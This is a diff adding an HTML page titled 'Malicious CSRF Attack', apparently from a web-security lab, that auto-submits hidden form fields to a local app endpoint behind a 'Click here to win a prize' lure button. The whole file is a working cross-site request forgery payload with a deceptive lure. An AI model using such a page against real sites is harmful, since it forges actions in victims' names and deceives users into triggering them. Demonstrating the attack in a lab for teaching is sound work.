@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+  <h2>Malicious CSRF Attack</h2>
+
+  <form action="http://127.0.0.1:8000/injection/add/" method="POST">
+    <input type="hidden" name="author" value="attacker">
+    <input type="hidden" name="entry" value="CSRF attack succeeded!">
+    <button type="submit">Click here to win a prize</button>
+  </form>
+
+</body>
+
+</html>
